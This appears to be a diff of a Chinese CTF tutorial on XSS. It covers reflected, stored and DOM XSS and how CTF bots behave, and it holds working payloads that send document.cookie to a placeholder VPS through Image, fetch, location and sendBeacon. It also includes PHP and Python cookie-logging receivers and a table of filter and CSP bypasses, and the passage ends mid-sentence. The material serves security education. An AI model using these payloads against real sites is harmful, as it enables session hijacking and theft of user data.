@@ -5,408 +5,622 @@ categories: [web安全, 常见漏洞]
 type: tech
 ---
 
-# 1. XSS
+# XSS 跨站脚本攻击
 
-XSS（跨站脚本）在前端执行你的JavaScript代码。在CTF中主要用来窃取Cookie——让管理员Bot访问你的恶意页面，把flag带出来。
+> XSS（Cross-Site Scripting）的本质是攻击者的 JavaScript 代码在目标网站的源（origin）下被执行。在 CTF 中，它主要用于让**管理员 Bot**访问你的恶意页面，把藏在 Cookie、DOM 或 LocalStorage 中的 flag 带出来。
+
+---
+
+## 一、场景 — XSS 在哪里出现
+
+### 1.1 典型场景
 
 XSS（Cross-Site Scripting，跨站脚本攻击）是指攻击者将恶意脚本注入到目标网站的前端页面中，当其他用户访问该页面时，注入的脚本在受害者浏览器中执行，从而窃取信息或冒充用户操作。
 
-"跨站"的含义是：脚本来自攻击者，但在受害者浏览器中的目标站点源（origin）下执行。它受同源策略、CSP 和浏览器权限约束：可以访问同源 DOM、LocalStorage 与非 `HttpOnly` Cookie，但不能读取 `HttpOnly` Cookie，也不能任意读取其他源的数据。
+```
+场景A：留言板/评论区 → 提交<script> → Bot访问 → Cookie外带
+场景B：搜索框回显 → 构造恶意链接 → 诱骗点击 → 窃取Session
+场景C：个人资料页 → 存储型XSS → 所有访客均受影响
+场景D：URL hash参数 → DOM型XSS → 不经过服务端
+场景E：SVG/HTML上传 → 含JS文件被解析 → 在目标源下执行
+```
 
-## 1.1 XSS 攻击的危害
+### 1.2 XSS 攻击的危害
 
 注入的脚本在受害者浏览器中以目标网站的"合法身份"运行，可以做到：
 
-- 窃取 Cookie（包括 HttpOnly 之外的 Session Token）并劫持用户会话
-- 读取页面中的敏感信息（CSRF Token、表单内容、页面 DOM）
-- 以受害者身份执行操作（转账、发帖、修改设置等）
-- 伪造登录框进行钓鱼
-- 结合其他漏洞攻击内网（利用受害者浏览器作为跳板）
+| 攻击目标 | 实现方式 | CTF 中的常见形式 |
+|---------|---------|----------------|
+| 窃取 Cookie | `document.cookie` | 外带 flag（非 HttpOnly） |
+| 读取页面 DOM | `document.body.innerHTML` | 页面中渲染的 flag |
+| 读取 LocalStorage | `window.localStorage` | 存储的 Token 或 flag |
+| 以用户身份操作 | fetch/XHR API | 以受害者身份发请求 |
+| 键盘记录 | `addEventListener('keydown')` | 窃取密码 |
+| 内网扫描 | 发请求到内网地址 | 探测 SSRF 入口 |
 
-CTF 中常见的场景是：题目模拟管理员 Bot 访问你留下的 XSS 内容，再读取 Bot 可访问的 Cookie、DOM、LocalStorage 或高权限接口响应；flag 不一定在 Cookie 中，`HttpOnly` Cookie 也无法通过 `document.cookie` 读取。
+### 1.3 CTF Bot 工作机制
 
-## 1.2 反射型 XSS
+Bot 是一个**无头浏览器**（Headless Chrome），由 Puppeteer/Playwright 驱动，模拟管理员访问你的页面：
 
-反射型 XSS（Reflected XSS）的恶意脚本作为 HTTP 请求的一部分（通常嵌在 URL 参数中）发送给服务器，服务器将其**原样拼入响应页面**返回，浏览器接收到响应后执行脚本。其特点为"非持久化"——脚本不在服务器存储，每次攻击需要受害者点击特制链接。
+```
+1. 启动无头浏览器实例
+2. 设置含flag的Cookie
+3. 访问你的留言/提交的URL
+4. 等待 domcontentloaded + 若干秒（让异步请求完成）
+5. 关闭浏览器
+```
 
-漏洞代码示例：
+**Bot 时序分析**：
+
+```
+Bot 启动
+  │
+  ├── Cookie 设置完毕
+  ├── 导航到你的页面
+  │     ├── HTML 加载完成 → domcontentloaded
+  │     ├── 你的 XSS 脚本执行
+  │     │     ├── 发送外带请求（竞态开始！）
+  │     │     └── 外带请求到达你的 VPS
+  │     └── Bot 等待 3~5 秒
+  │
+  └── Bot 关闭浏览器
+        └── 未完成的网络请求被取消
+```
+
+外带请求必须在 Bot 关闭前到达你的 VPS，否则请求被取消。
+
+---
+
+## 二、原理 — 三种 XSS 的底层差异
+
+### 2.1 反射型 XSS
+
+恶意脚本在**URL参数**中，服务端拼入响应HTML返回。
+
+```
+流程：构造恶意URL → 服务器拼接HTML → 浏览器执行
+```
 
 ```php
 <?php
-// 直接拼接 GET 参数到 HTML 中，未做任何转义
+// 危险：直接拼接GET参数到页面
 echo '<pre>Hello ' . $_GET['name'] . '</pre>';
 ?>
 ```
 
-攻击者构造如下链接诱骗受害者点击：
+触发条件：需要受害者点击特制链接，非持久化。
+
+### 2.2 存储型 XSS
+
+恶意脚本被**持久化存储在服务端**（数据库/文件），任何访问页面的用户都会中招。
 
 ```
-http://target.com/search.php?name=<script>alert('XSS')</script>
+流程：提交恶意内容 → 存入数据库 → 访客读取时执行
 ```
-
-浏览器渲染返回的 HTML 时，`<script>alert('XSS')</script>` 被当作合法脚本执行。
-
-触发方式：攻击者需诱骗受害者点击特制链接。常见出没于搜索框、报错提示等将 URL 参数回显到页面中的位置。
-
-## 1.3 存储型 XSS
-
-存储型 XSS（Stored XSS，也称持久型 XSS）的恶意脚本被**持久化存储在服务端**（数据库、文件等），当任何用户访问包含该内容的页面时，脚本从数据库取出拼入页面并执行。不需要用户点击特定链接，受害者只要正常浏览页面就会中招。
-
-漏洞代码示例：
 
 ```php
 <?php
-// 写入时：直接存储用户输入，未过滤
+// 写入时未过滤
 $comment = $_POST['comment'];
 $query = "INSERT INTO comments (content) VALUES ('$comment')";
-mysql_query($query);
 
-// 读取时：直接输出到 HTML，未转义
-$result = mysql_query("SELECT content FROM comments");
-while ($row = mysql_fetch_array($result)) {
-    echo "<div>" . $row['content'] . "</div>";
-}
+// 读取时未转义
+echo "<div>" . $row['content'] . "</div>";
 ?>
 ```
 
-攻击者只需在留言板、评论区等入口提交 `<script>恶意代码</script>`，任何访问该页面的用户都会执行这段脚本。CTF 中的存储型 XSS 常配合 Bot 模拟管理员审核机制——攻击者留言后，Bot 自动访问并执行脚本，携带管理员的 Cookie（含 flag）。
+CTF最常见：配合 Bot 审核机制，留言后 Bot 自动访问执行。
 
-## 1.4 DOM 型 XSS
+### 2.3 DOM 型 XSS（详解）
 
-DOM 型 XSS（DOM-Based XSS）与前两者的根本区别在于：危险的数据流和执行 Sink 位于浏览器端。服务器返回的页面或脚本仍可能参与传递输入，但服务端不需要把 payload 直接拼成响应 HTML；客户端 JavaScript 从 URL（`location.href`、`location.hash`、`document.referrer` 等）或 `window.name` 等来源读取数据后，再写入危险 Sink。
+漏洞完全发生在**浏览器端**，服务端不参与 payload 拼接。
 
-漏洞代码示例：
-
-```html
-<html>
-<body>
-  <script>
-    // 从 URL 获取 a 参数的值，直接写入页面
-    var url = document.URL;
-    document.write(url.substring(url.indexOf("a=") + 2));
-  </script>
-</body>
-</html>
+```
+流程：URL中携带恶意数据 → 前端JS读取 → 写入危险Sink → 执行
 ```
 
-访问 `http://target.com/dom.html?a=<script>alert('XSS')</script>` 即可触发。
+#### Source（数据入口）
 
-DOM 型 XSS 关注两个环节：**输入源（Source）**和**输出汇（Sink）**。
+| Source | 读取方式 | 说明 |
+|:------:|---------|------|
+| `location.href` | `document.URL` | 完整 URL，含参数 |
+| `location.hash` | `location.hash` | `#` 后的部分，不发送到服务端 |
+| `location.search` | `location.search` | `?` 后的查询字符串 |
+| `document.referrer` | `document.referrer` | 来源页面的 URL |
+| `window.name` | `window.name` | 窗口/标签页名称，跨页面保留 |
+| `postMessage` 数据 | `message.data` | 跨窗口通信 |
+| `document.cookie` | 读写 Cookie | 只有 XSS 后才能读取 |
+| `history.pushState` | `location` | 修改浏览器历史状态 |
+| `localStorage` | `getItem()` | 持久化本地存储 |
+| `sessionStorage` | `getItem()` | 会话级本地存储 |
 
-- Source：攻击者能控制的数据入口——URL 参数、hash、referrer、postMessage 等
-- Sink：JavaScript 把数据写入页面的地方——如果数据未经处理直接到达 Sink，就可能被执行
+#### Sink（危险写入）
 
-流程：攻击者把恶意脚本放在 Source 中 → 页面 JS 读取 Source 的值 → 不做任何处理直接传给 Sink → 浏览器执行脚本。表格是常见的 Source 和 Sink 列举，实际任意 Source 配任意 Sink 均可产生 DOM 型 XSS：
+| Sink | 是否创建新标签 | 示例 |
+|:----:|:-------------:|------|
+| `document.write()` |  | `document.write('<script>alert(1)</script>')` |
+| `innerHTML` |  但不执行 `<script>` | `el.innerHTML = '<img src=x onerror=alert(1)>'` |
+| `outerHTML` |  | `el.outerHTML = '<div onclick=alert(1)>click</div>'` |
+| `eval()` | （执行 JS 代码） | `eval('alert(1)')` |
+| `setTimeout()` string |  | `setTimeout('alert(1)', 0)` |
+| `setInterval()` string |  | `setInterval('alert(1)', 100)` |
+| `Function()` 构造函数 |  | `new Function('alert(1)')()` |
+| `insertAdjacentHTML()` |  | `el.insertAdjacentHTML('beforeend', '<img onerror=alert(1) src=x>')` |
+| `location.href` | （URL 跳转） | `location.href = 'javascript:alert(1)'` |
+| `document.domain` |  | 修改同源策略 |
 
-| Source（数据从哪来） | Sink（数据写到哪里，危险） |
-|---|---|
-| `location.href`、`location.hash`（完整 URL / # 后面片段） | `document.write()`（直接写入页面，可输出 HTML 标签） |
-| `document.URL`（页面完整 URL，同 location.href） | `innerHTML`（赋值即解析 HTML，`<script>` 不执行但可配合事件属性） |
-| `document.referrer`（来源页面 URL，HTTP Referer 头） | `eval()`（把字符串当 JavaScript 代码执行） |
-| `window.name`（窗口名称，可跨页面保留且容量通常较大） | `setTimeout()` / `setInterval()`（字符串参数会按代码求值） |
-| `postMessage` 接收的数据（跨窗口/iframe 通信通道） | `document.location`（赋值即触发页面跳转） |
+#### 从 Source 到 Sink 的完整攻击链
 
-## 1.5 三种 XSS 对比
+```
+攻击者构造 URL:
+http://target/page.html#<img src=x onerror=alert(1)>
+                  │
+                  ▼
+服务端原样返回 HTML（不拼接 payload）
+                  │
+                  ▼
+浏览器加载页面，执行 JS:
+  var hash = location.hash.slice(1);  // Source: 读取hash
+  document.getElementById('output').innerHTML = hash; // Sink: 写入DOM
+                  │
+                  ▼
+<img src=x onerror=alert(1)>  被插入页面
+                  │
+                  ▼
+图片加载失败 → onerror 触发 → JS 执行
+```
 
-| | 反射型 | 存储型 | DOM 型 |
-|---|---|---|---|
-| 脚本存储位置 | URL 参数中 | 服务端数据库 | 不在服务端，在 URL/DOM 中 |
-| 是否持久化 | 否 | 是 | 否 |
-| 触发条件 | 点击链接 | 访问页面即触发 | 点击链接 |
-| 服务端参与 | 是（拼接 HTML） | 是（存储并输出） | 漏洞 Sink 在客户端；服务端仍可能提供页面和数据 |
-| CTF 常见程度 | 一般 | 最常见（配合 Bot） | 较少 |
+### 2.4 三种 XSS 对比总结
 
-## 1.6 验证 XSS 漏洞
+| 对比维度 | 反射型 | 存储型 | DOM型 |
+|---------|-------|-------|-------|
+| 脚本存储 | URL参数中 | 服务端数据库 | URL/DOM中 |
+| 持久化 | 否 | 是 | 否 |
+| 触发条件 | 点击恶意链接 | 访问页面即触发 | 点击链接 |
+| 服务端参与 | 是（拼接HTML） | 是（存储+输出） | 否（Sink在客户端） |
+| CTF常见度 | 一般 | 最常见（配合Bot） | 较少 |
+| 绕过 CDN 缓存 | 需独立 URL | 对所有用户生效 | 仅影响特定浏览器 |
+| 检测难度 | 低 | 中 | 高（服务端日志无 payload） |
+| 修复方式 | 输出编码 | 输出编码+输入过滤 | 避免危险 Sink |
 
-学习 XSS 的第一步是确认漏洞是否存在。最简单的验证方式是在可疑输入点注入一段能让浏览器执行 JS 的代码，观察是否弹窗。
+---
 
-**常用验证 Payload：**
+## 三、实战 — 验证、外带与绕过
 
+### 3.1 验证 XSS 是否存在
+
+最简验证 payload：
 ```html
 <script>alert(1)</script>
-<script>alert('XSS')</script>
 ```
 
-如果页面弹出了对话框，说明输入被当作 HTML/JS 执行了，此处存在 XSS 漏洞。
-
-验证阶段不需要复杂的 payload，用最简形式即可。如果 `<script>` 被过滤，可以换用事件属性试探：
-
+如果 `<script>` 被过滤，换用事件属性：
 ```html
 <img src=x onerror=alert(1)>
 <svg onload=alert(1)>
 <body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
 ```
 
-验证目标的优先级：把 `alert(1)` 弹出来 → 再考虑怎么利用。不要一上来就写完整的外带 payload，先确认漏洞存在，再逐步构造。
+**验证原则：先确认弹窗，再构造利用。**不要一上来就写完整外带 payload。
 
-## 1.7 外带数据原理
+### 3.2 数据外带三种方式
 
-确认 XSS 存在后，攻击者需要把目标数据（Cookie、页面内容等）从受害者的浏览器**发送到自己可控的服务器**，这就是"数据外带"（Data Exfiltration）。
-
-CTF 中 flag 可能位于受害者可访问的 Cookie、DOM、LocalStorage 或高权限接口响应中。核心思路是先确认数据位置和浏览器权限，再让浏览器向攻击者服务器发送携带目标数据的请求。
-
-**方式一：Image 外带（简单 GET）**
+#### 方式一：Image 外带（最简GET）
 
 ```html
-<script>new Image().src='http://你的VPS/?cookie='+encodeURIComponent(document.cookie)</script>
+<script>new Image().src='http://你的VPS/?flag='+encodeURIComponent(document.cookie)</script>
 ```
 
-原理：`new Image()` 创建一个 Image 对象，给 `.src` 赋值时浏览器会立即向该 URL 发送 GET 请求。`encodeURIComponent()` 对 Cookie 值做 URL 编码，防止 `#`、`=`、`;` 等字符破坏 URL 结构或导致参数截断。
+原理：给 `Image.src` 赋值即触发 GET 请求，不需要读取响应。跨域友好。
 
-Image 外带不需要读取跨域响应，写法简单，常用于 Bot 题；但请求能否在页面关闭前完成仍取决于浏览器、CSP、网络和 Bot 等待时间，不能保证比 `fetch()` 更稳定。
-
-**方式二：fetch() 外带**
+#### 方式二：fetch 外带（异步不跳转）
 
 ```html
-<script>fetch('http://你的VPS/?cookie='+encodeURIComponent(document.cookie))</script>
+<script>fetch('http://你的VPS/?flag='+encodeURIComponent(document.cookie))</script>
 ```
 
-`fetch()` 是浏览器原生 API，发送异步 HTTP 请求。优点是不跳转页面；缺点是异步——Bot 关闭页面过早时请求可能未完成就被取消。
+优点：不跳转页面。缺点：Bot 关闭浏览器时未完成的 fetch 可能被取消。
 
-**方式三：location 跳转**
+#### 方式三：location 跳转（导航式外带）
 
 ```html
-<script>location='http://你的VPS/?cookie='+document.cookie</script>
+<script>location='http://你的VPS/?flag='+document.cookie</script>
 ```
 
-直接修改 `location` 会把页面导航到攻击者服务器；这个导航请求本身就是外带请求，通常不会因为原页面卸载而"被取消"，但它会破坏当前页面和后续脚本执行，因此是否适合取决于 Bot 流程。
+导航请求本身携带数据，通常不会被自身取消，但会中断后续脚本。
 
-> **提示**：`encodeURIComponent` 对保护 URL 结构很重要。查询参数中真正会改变结构的主要是 `&`、`#`，`+` 还可能在表单式解析中被当作空格；额外的 `=` 通常仍属于当前参数值，但编码后处理最稳妥。
+#### 三种方式对比
 
-## 1.8 Cookie 窃取完整流程（CTF 实战）
+| 方式 | 可靠性 | 是否跳转 | 是否异步 | 跨域 | 读取响应 |
+|:----:|:-----:|:--------:|:--------:|:----:|:--------:|
+| `new Image().src` | 较高 | 否 | 否（触发即发） | 是 |  |
+| `fetch()` | 一般 | 否 | 是 | 是（简单请求） | 可通过 CORS |
+| `location.href=` | 较高 | 是 | 否 | 是 |  |
 
-了解了外带原理后，来看一个完整的 CTF XSS 题目怎么解决。典型模式：题目启用一个 Bot（Headless 浏览器）自动访问留言板/评论区，Bot 持有含有 flag 的 Cookie。攻击者需在页面中植入 XSS 脚本，让 Bot 执行后将 `document.cookie` 外带到自己控制的服务器。
+### 3.3 Cookie 窃取完整流程
 
-**第一步：在 VPS 上搭建接收端**
+#### 【场景】留言板 Bot 型 XSS
+
+目标：Bot 访问留言后，把 `document.cookie` 中的 flag 发送到你的 VPS。
+
+#### 【实战四步流程】
+
+**第一步：VPS 搭建接收端**
 
 ```bash
-apt update && apt install -y apache2 php && systemctl start apache2
-cd /var/www/html
-cat > xss.php << 'EOF'
+# PHP接收脚本
+cat > /var/www/html/xss.php << 'EOF'
 <?php
 header('Access-Control-Allow-Origin: *');
 $cookie = $_GET['cookie'] ?? 'No cookie';
 $ip = $_SERVER['REMOTE_ADDR'];
 $time = date('Y-m-d H:i:s');
-$log = "========================================\nTime: $time\nIP: $ip\nCookie: $cookie\n========================================\n\n";
+$log = "Time: $time\nIP: $ip\nCookie: $cookie\n\n";
 file_put_contents("cookie.txt", $log, FILE_APPEND);
-echo "OK";
 ?>
 EOF
-touch cookie.txt
-chmod 644 xss.php
-chmod 666 cookie.txt   # CTF 临时接收端；真实环境应改为正确属主和最小权限
 ```
 
-接收端访问地址为 `http://你的VPS/xss.php?cookie=`，收到的 Cookie 追加写入 `cookie.txt`。
+```bash
+# Python 简易接收端
+cat > server.py << 'EOF'
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import urllib.parse
 
-**第二步：构造并提交 XSS Payload**
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
+        cookie = params.get('cookie', [''])[0]
+        with open('cookies.txt', 'a') as f:
+            f.write(f"{cookie}\n")
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'OK')
 
-在留言板/评论区输入 XSS 脚本，提交后 Bot 自动访问并执行：
+HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
+EOF
+```
+
+**第二步：提交 XSS Payload**
 
 ```html
-<script>new Image().src='http://你的VPS/xss.php?cookie='+encodeURIComponent(document.cookie)</script>
+<script>new Image().src='http://你的VPS:8080/?cookie='+encodeURIComponent(document.cookie)</script>
 ```
 
-这里使用 `new Image().src` 是因为它适合发送简单跨域 GET（参见 13.9 节 Bot 机制），不代表在所有浏览器中都比 `fetch()` 更可靠。`encodeURIComponent` 对 Cookie 做 URL 编码，防止特殊字符破坏 URL 结构。
+**第三步：等待 Bot 访问**
 
-**第三步：接收 flag**
+大多数 CTF 平台有"提交 URL 给 Bot"的入口。将留言页面的 URL 提交给 Bot。
+
+**第四步：查看接收的 flag**
 
 ```bash
 cat /var/www/html/cookie.txt
-# 输出中包含 Cookie: flag{...}
+# 或查看 Python 服务器的 stdout
 ```
 
-## 1.9 Bot 机制与外带稳定性
+#### 当 flag 不在 Cookie 中时的备用方案
 
-CTF 中 XSS 题目的 Bot 本质是一个**无头浏览器**（Headless Chrome），由 Puppeteer 或 Playwright 这类自动化框架驱动，模拟管理员访问页面。理解 Bot 的行为规律，才能确保外带请求在 Bot 关闭前完成。
+| 数据位置 | 外带脚本 | 适用条件 |
+|---------|---------|---------|
+| `document.cookie` | `encodeURIComponent(document.cookie)` | 非 HttpOnly Cookie |
+| `localStorage` | `JSON.stringify(localStorage)` | 存储在 localStorage |
+| `sessionStorage` | `JSON.stringify(sessionStorage)` | 存储在 sessionStorage |
+| 页面 DOM | `document.body.innerHTML` | flag 渲染在页面中 |
+| 接口响应 | `fetch('/api/flag').then(r=>r.text()).then(d=>new Image().src='http://VPS/?d='+d)` | 需以 Bot 身份发请求 |
 
-**典型 Bot 工作流程：**
+### 3.4 Bot 竞态条件深入分析
 
-1. 启动一个无头浏览器实例
-2. 访问目标页面，等待 `domcontentloaded` 事件触发
-3. 页面 JS 执行完毕（攻击者注入的 XSS 脚本也在此时执行），等待若干秒让异步请求完成
-4. 关闭浏览器
+#### 【场景】外带请求总是收不到，即使确认 XSS 存在
 
-**为什么有时收不到外带请求（竞态条件）：**
+#### 【原因】Bot 生命周期与网络延迟的竞态
 
-`fetch()` 是**异步**操作——调用后不阻塞代码继续执行，也不阻止浏览器关闭。Bot 的等待时间是有限的（通常 3-5 秒），如果在这段时间内服务器未响应，Bot 关闭浏览器时会取消所有未完成的网络请求：
+```
+时间线：
+T+0ms   Bot 开始访问页面
+T+50ms  HTML 加载完成，XSS 脚本开始执行
+T+51ms  脚本发出 fetch() 请求（异步、不阻塞）
+T+52ms  脚本继续执行完毕（没有更多代码）
+T+3000ms Bot 等待结束（假设等待 3 秒）
+T+3001ms Bot 关闭浏览器
+          └── 此时未完成的 fetch() 请求被取消
+          └── 你的 VPS 没有收到请求
+```
 
-- 网络通畅、VPS 响应快 → fetch 在 Bot 关闭前完成 → 收到 flag
-- 网络延迟、VPS 响应慢 → Bot 关闭时请求未完成 → 收不到
+#### 【竞态成功的条件】
 
-**常见外带方式的行为差异：**
+```
+外带请求发送时间 + 网络延迟 ≤ Bot 等待时间
+```
 
-| 方式 | 行为 | 注意点 |
-|---|---|---|
-| `new Image().src` | 发送简单 GET，不需要读取响应 | 仍可能受 CSP、网络和页面关闭影响 |
-| `fetch()` | 异步且不跳转页面 | 未完成请求可能在页面/浏览器关闭时被取消；跨域响应通常不可读，但简单请求仍可发出 |
-| `location.href=` | 导航请求本身携带数据 | 会离开原页面并中断后续脚本，但导航请求不是"先发出再被自身取消" |
+#### 【改善方案】
 
-**实战建议：**
+| 方案 | 原理 | 效果 |
+|:----:|:----:|:----:|
+| 使用 Image 外带 | 触发即发，浏览器不等待响应 | 最佳 |
+| 减少 payload 大小 | 减轻解析和网络负担 | 中等 |
+| 使用同步 XHR | `xhr.open('GET', url, false)` 同步阻塞 | 可能被浏览器废弃 |
+| 加长等待时间 | `setTimeout(fetch, 3000)` | 不一定有用，Bot 可能已关闭 |
+| 使用 `navigator.sendBeacon()` | 页面关闭时仍尝试发送 | Web 标准推荐 |
+
+**`sendBeacon` 方案**：
 
 ```html
-<!-- Image 外带：常用的简单 GET 写法 -->
-<script>new Image().src='http://你的VPS/?cookie='+encodeURIComponent(document.cookie)</script>
+<script>
+// sendBeacon 在页面/浏览器关闭时仍会尝试发送
+navigator.sendBeacon(
+    'http://你的VPS/?cookie=' + encodeURIComponent(document.cookie)
+);
+</script>
 ```
 
-如果打了多遍都收不到外带请求，优先检查 VPS 是否能被题目环境访问（安全组放行端口、题目和 VPS 网络是否通）。
+### 3.5 Payload 绕过速查（按难度递进）
 
-## 1.10 绕过过滤技巧
+#### Level 1: 标签名过滤
 
-CTF 题目的难度提升通常体现在输入过滤上。以下按从简单到复杂的顺序介绍常见绕过方法。
-
-**1. 标签名过滤绕过**
-
-后端过滤了 `script`、`img`、`body` 等特定标签名（不区分大小写）。HTML 中有大量标签支持事件属性，换用不在黑名单中的标签即可：
+后端过滤了 `script` `img` `body` 等标签，换用其他标签事件：
 
 ```html
-<svg onload=fetch('http://你的VPS/?cookie='+document.cookie)></svg>
-<iframe onload=fetch('http://你的VPS/?cookie='+document.cookie)>
-<input onfocus=fetch('http://你的VPS/?cookie='+document.cookie) autofocus>
-<marquee onstart=fetch('http://你的VPS/?cookie='+document.cookie)>
-<details open ontoggle=fetch('http://你的VPS/?cookie='+document.cookie)>
+<svg onload=alert(1)>
+<iframe onload=alert(1)>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
 ```
 
-`autofocus` 属性让 `<input>` 自动获得焦点，触发 `onfocus`；`open` 属性让 `<details>` 默认展开，触发 `ontoggle`。这些"自动触发"的属性确保事件处理函数在页面加载时就被执行，不需要用户交互。
+#### Level 2: 空格过滤
 
-**2. 空格过滤绕过**
-
-后端过滤了**任意空白字符**（空格、Tab、换行），而 HTML 标签名和属性之间通常需要空格。HTML 解析器允许用 `/` 代替标签名后的第一个空格：
+HTML 标签名和属性间需要空格？用 `/` 代替：
 
 ```html
-<!-- 正常写法（标签名与属性间有空格） -->
-<svg onload=fetch('http://你的VPS/')>
-<!-- 无空格写法（用 / 分隔） -->
-<svg/onload=fetch('http://你的VPS/')>
+<svg/onload=alert(1)>
 ```
 
-JS 代码中的空格也需要消除。`new Image()` 中间有空格，改用 `new(window.Image)()` 即可避免：
+JS 内部空格：`new Image()` → `new(window.Image)()`
 
-```html
-<svg/onload="new(window.Image)().src='http://你的VPS/?cookie='+encodeURIComponent(document.cookie)"></svg>
-```
+#### Level 3: 大小写混淆
 
-**3. 大小写混淆**
-
-WAF 的正则匹配可能只覆盖了全小写形式，HTML 标签名和属性名是不区分大小写的，改用大小写混合即可绕过：
+HTML 标签和属性不区分大小写：
 
 ```html
 <ScRiPt>alert(1)</ScRiPt>
-<SvG/OnLoAd=fetch('http://你的VPS/')>
+<SvG/OnLoAd=fetch('http://VPS/')>
 ```
 
-**4. 双写绕过**
+#### Level 4: 双写绕过
 
-后端将敏感关键词替换为空字符串，但**只替换一次**（比如用 `str_replace` 或 `preg_replace` 不循环替换）。将敏感词自身嵌套书写，删掉中间部分后首尾拼接恢复原词：
+单次替换过滤，嵌套使删除后恢复：
 
 ```html
 <scrscriptipt>alert(1)</scrscriptipt>
-<!-- 删除内层的 "script" → 剩下外层拼接成 <script> -->
+<!-- 删除"script" → 剩下 <script>alert(1)</script> -->
 ```
 
-**5. 编码绕过**
+#### Level 5: 反引号替代引号
 
-HTML 字符实体（Character Entity）是一种用 `&名字;` 或 `&#数字;` 表示特殊字符的方式。例如 `&lt;` 表示 `<`（less-than），`&gt;` 表示 `>`（greater-than），`&quot;` 表示 `"`。
-
-如果 WAF 通过检测 `<`、`>` 等字符来拦截 HTML 标签，可以尝试用实体编码代替：
+引号被过滤时用模板字符串：
 
 ```html
-&lt;script&gt;alert(1)&lt;/script&gt;
+<svg/onload=fetch(`http://VPS/?cookie=${document.cookie}`)>
 ```
 
-但是，**实体编码能否生效，取决于注入的数据经过了什么处理流程**。区分两种核心场景：
+支持 `${}` 表达式嵌入，省去 `+` 拼接。
 
-**场景一：服务端直接拼接 HTML（无效）**
+#### Level 6: eval + 反引号
 
-```php
-<?php
-// 用户输入直接拼入 HTML 源码，作为字符串返回给浏览器
-echo "<div>" . $_GET['name'] . "</div>";
-?>
-```
-
-用户输入 `&lt;script&gt;alert(1)&lt;/script&gt;`，服务器返回的 HTML 源码是：
+需要执行复杂代码时：
 
 ```html
-<div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
+<svg/onload=eval(`fetch('http://VPS/?flag='+document.cookie)`)>
 ```
 
-浏览器解析这段 HTML 源码时：`<div>` 被识别为标签开始，`&lt;script&gt;...` 处于标签之间的**文本内容**位置，实体被解码显示为 `<script>alert(1)</script>` 文字——但浏览器**不会**再把这段解码后的文字当作新标签来解析。HTML 的解析只有一轮：标签结构先确定，实体解码在后。此处实体解码后的结果只是页面上的可见文本，不会创建 `<script>` 元素。
+#### Level 7: 编码绕过（属性值内有效）
 
-**结论**：反射型和存储型 XSS（数据经服务端拼入 HTML 源码）中，实体编码绕过**无效**。
-
-**场景二：通过 `innerHTML` 等 DOM API 写入（编码后的整段标签仍无效）**
+仅在事件属性值内部，实体编码被解码后进入 JS：
 
 ```html
-<script>
-  var name = "&lt;script&gt;alert(1)&lt;/script&gt;";
-  document.getElementById('output').innerHTML = name;
-</script>
+<img src=x onerror="fetch(&#x27;http://VPS/?c=&#x27;+document.cookie)">
 ```
 
-`innerHTML` 会把传入字符串按 HTML 片段解析，但字符引用解码得到的 `<` 会作为文本字符插入，不会被重新送回分词器当作标签起始符。因此上面的 `&lt;script&gt;...` 仍只会显示文本，不会创建 `<script>` 元素。
+**注意：** 实体编码不能用于创建新标签。`&lt;script&gt;` 在服务端拼入 HTML 后只是普通文本，不会创建 `<script>` 元素。
 
-即使传入的是实际字符串 `<script>alert(1)</script>`，HTML 标准也规定通过 `innerHTML` 插入的 `<script>` 元素不执行；但是实际的事件属性元素仍可能触发，例如：
+#### 绕过技巧完整对照表
+
+| 难度 | 过滤类型 | payload 示例 | 绕过原理 |
+|:----:|:--------:|:-----------:|:--------:|
+| L1 | 标签名黑名单 | `<svg onload=alert(1)>` | 使用其他标签事件属性 |
+| L2 | 空格过滤 | `<svg/onload=alert(1)>` | `/` 代替空格 |
+| L3 | 大小写匹配 | `<SvG/OnLoAd=...>` | HTML 不区分大小写 |
+| L4 | 单次替换 | `<scrscriptipt>` | 删除中间后首尾拼接 |
+| L5 | 引号过滤 | 反引号模板字符串 | JS 模板字符串 |
+| L6 | 复杂代码 | `eval(\`...\`)` | 字符串执行 |
+| L7 | 关键词检测 | 实体编码 | HTML 属性值内解码 |
+| L8 | 贪婪匹配 | `<svg><svg/onload=alert(1)>` | 拆分关键词 |
+| L9 | 协议过滤 | `//VPS/` | 协议相对 URL |
+| L10 | 括号过滤 | `onerror=alert` 无括号 | 需要特定上下文 |
+
+### 3.6 CSP 绕过要点
+
+当页面存在 Content-Security-Policy 时，需有针对地选择外带方式：
+
+#### CSP 指令与绕过思路
+
+| CSP 指令 | 绕过思路 | 示例 |
+|---------|---------|------|
+| `script-src 'self'` | 找同源 JSONP 接口 | `<script src="/api/jsonp?callback=alert(1)">` |
+| `script-src 'unsafe-inline'` | 允许内联脚本 | 正常注入 |
+| `script-src 'nonce-xxx'` | 不能猜测 nonce | 很难绕过 |
+| `img-src *` | Image 外带不受限 | `new Image().src='http://VPS/'` |
+| `connect-src *` | fetch/XHR 外带不受限 | `fetch('http://VPS/')` |
+| `default-src 'none'` | 一切受限，需找漏报 | 找 `<base>` 标签注入 |
+| `img-src 'self'` | Image 外带受限 | 找同源图片上传+SSRF |
+| `script-src 'self' 'unsafe-eval'` | 允许 eval | `eval(String.fromCharCode(...))` |
+
+#### JSONP 绕过 'self'
+
+当 CSP 设置为 `script-src 'self'` 时，同源的 JSONP 接口可以作为脚本源：
 
 ```html
-<script>
-  document.getElementById('output').innerHTML = '<img src=x onerror=alert(1)>';
-</script>
+<!-- 如果目标网站有 /api/jsonp?callback=xxx -->
+<script src="/api/jsonp?callback=alert(1)"></script>
+<!-- 如果 callback 参数可被注入 JS 代码 -->
 ```
 
-所以判断 `innerHTML` 风险时，应区分"编码后的标签文本""实际 `<script>` 标签"和"带事件属性的实际元素"。`document.write()` 在文档解析期间写入实际 `<script>` 标记时行为又不同，不能和 `innerHTML` 合并成一个结论。
+#### `<base>` 标签劫持
 
-**场景三：事件属性内部（有效）**
-
-实体编码在已有属性值内部会被 HTML 解析器解码，并把解码后的字符交给后续的 JavaScript 属性处理。例如后端过滤了单引号时，下面写法在对应上下文中可能有效：
